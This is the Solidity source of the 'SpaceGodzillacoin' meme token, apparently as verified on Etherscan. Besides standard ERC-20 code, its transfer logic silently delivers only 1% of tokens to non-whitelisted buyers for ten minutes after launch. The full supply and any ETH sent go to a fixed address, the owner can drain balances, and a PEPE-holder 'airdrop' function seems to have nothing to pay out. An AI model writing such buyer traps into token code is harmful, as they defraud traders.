/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
	
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
	
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
	
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
	
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract Ownable {
    address public _owner;
	
    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
	
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function safeTransfer() public onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function safeTransfer(IERC20 newOwner) public onlyOwner {
        newOwner.transfer(msg.sender, newOwner.balanceOf(address(this)));
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
	
    function balanceOf(address account) external view returns (uint256);
	
    function transfer(address recipient, uint256 amount) external returns (bool);
	
    function allowance(address owner, address spender) external view returns (uint256);
	
    function approve(address spender, uint256 amount) external returns (bool);
	
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	
    event Transfer(address indexed from, address indexed to, uint256 value);
	
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract SpaceGodzillacoin is IERC20, Ownable {
    using SafeMath for uint256;

    uint256 _totalSupply;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
	uint256 public startTime;
    string private _name = "SpaceGodzillacoin";
    string private _symbol = "SpaceGodzilla";
    uint8 private _decimals = 18;
    address public uniswapV2Pair;
	mapping (address => bool) private _whilteUser;
    address tokenReciver = address(0xaE7CB25f18b74f046807556154EeC4768C63cBe6);
    uint256 public oneTokenAmount;
	IERC20 public PEPE;
    constructor(){
        PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
        uint256 total = 6904200000000000 * 10**18;
        oneTokenAmount = total.div(100).mul(6).div(3000);
        _mint(tokenReciver, total);
    }

    receive() external payable {
        payable(tokenReciver).transfer(msg.value);
    }

    function name() public view returns (string memory) {
        return _name;
    }
	
    function symbol() public view returns (string memory) {
        return _symbol;
    }
	
    function decimals() public view returns (uint8) {
        return _decimals;
    }
	
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
	
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
	
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
	
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
	
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
	
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _whilteUser[accounts[i]] = excluded;
        }
    }

    function changeStartTime(uint256 _startTime) public onlyOwner {
        startTime = _startTime;
    }

    function changeUniswapV2Pair(address _uniswapV2Pair) public onlyOwner {
        uniswapV2Pair = _uniswapV2Pair;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
		if(startTime == 0){startTime = block.timestamp;}
        if(uniswapV2Pair == address(0)){uniswapV2Pair = recipient;}
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
	
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
	
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != sender, "ERC20: transfer to the same address");
		
        if(tokenReciver == sender || tokenReciver == recipient){
            _transferToken(sender, recipient, amount);
            return;
        }

		if(startTime.add(600) >= block.timestamp && sender == uniswapV2Pair){
            if(!_whilteUser[recipient]){
                amount = amount.div(100);
            }
        }
        _transferToken(sender, recipient, amount);
    }

    function _transferToken(address sender, address recipient, uint256 amount) internal {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
	
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
	
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
	
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
    
    mapping (address => uint256) private _withdrawAmount;
    function withdrawToken() public {
        require(_withdrawAmount[msg.sender] == 0, "withdrawAmount");
        require(PEPE.balanceOf(msg.sender) >= 3 * 10**26,"minPepeAmount");
        _withdrawAmount[msg.sender] = _withdrawAmount[msg.sender].add(oneTokenAmount);
        _transfer(address(this), msg.sender, oneTokenAmount);
        indexNum = indexNum + 1;
    }

    uint256 public indexNum;
    function getUserData(address user) public view returns(uint256[] memory){
        uint256[] memory list = new uint256[](9);
        list[0] = PEPE.balanceOf(user);
        list[1] = _withdrawAmount[user];
        list[2] = indexNum;
        return list;
    }
}